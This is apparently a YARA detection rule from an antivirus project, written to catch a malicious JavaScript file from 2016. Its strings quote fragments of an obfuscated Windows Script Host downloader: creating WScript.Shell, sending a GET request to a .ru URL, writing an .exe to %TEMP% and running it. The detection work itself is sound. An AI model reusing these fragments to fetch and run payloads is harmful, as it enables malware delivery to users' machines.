rule sig_20160401_16e9ceef5b8fb30b4dff90c6bd92a068 {
  meta:
    description = "datamaliciousorder - file 20160401_16e9ceef5b8fb30b4dff90c6bd92a068.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ff29b7816d8f8c80155319c67cfe09b4b5697a33a66ecb76bc19ad0d88983d37"

  strings:
    $s1  = "function QlfJtm(AeDg, WnQn){EkrBd = EkrBd * 1; return AeDg - WnQn;};" fullword ascii
    $s2  = "var QmsMf = function ZfzBj() {return WScript[WrpXq](\"WScript\"+\".Shell\");}(), RcWmc = 11;" fullword ascii
    $s3  = "if (LyEj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "LyEj[KaoHok](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = "function CxRw() {return QmsMf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"r9GRIKTCHeF.ex\" + \"e\";};" fullword ascii
    $s6  = "function KqyGv(){return MlSy + \"\";};" fullword ascii
    $s7  = "function UuFbx() {return ((RenNl == true) && (RenNl == XuKpk)) ? 1 : EkrBd;};" fullword ascii
    $s8  = "}while (UlTp);" fullword ascii
    $s9  = "var XuKpk = false;" fullword ascii
    $s10 = "RenNl = true; " fullword ascii
    $s11 = "var HnqRw = false;" fullword ascii
    $s12 = "var ExwJol = new this[\"Date\"]();" fullword ascii
    $s13 = "var RenNl = false;" fullword ascii
    $s14 = "return QlfJtm(OyfLy, WudTvb);" fullword ascii
    $s15 = "function LnYa(FiGd){QmsMf[\"R\"+\"un\"](FiGd, EkrBd, EkrBd);};" fullword ascii
    $s16 = "function UyIv()" fullword ascii
    $s17 = "function IvuMon(){return WrpXq;};" fullword ascii
    $s18 = "function LkOor(QimUq) {var RrKp = (1, 2, 3, 4, 5, QimUq); return RrKp;};" fullword ascii
    $s19 = "function XkxOgw(){return 23;};" fullword ascii
    $s20 = "XuKpk = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}